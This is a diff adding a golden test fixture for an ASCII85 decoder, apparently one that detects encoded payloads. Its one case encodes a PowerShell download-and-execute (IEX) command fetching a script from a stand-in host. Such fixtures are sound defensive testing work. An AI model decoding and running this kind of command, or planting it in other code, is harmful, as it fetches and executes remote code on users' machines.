@@ -1,0 +1,2 @@
+# ascii85-decode · Golden Fixtures · RC3.2a
+{"case_id": "a85-plain-ps", "description": "ASCII85 Adobe \u2192 PowerShell IEX", "input": "E,Tr3EcYo*Cht_8G\\&!L@iuse79C[GFEDI_0/$`d@P;sYE-!`X", "detect_min_confidence": 0.4, "expected_output_contains": ["powershell", "IEX", "http://a.b/x.ps1"]}
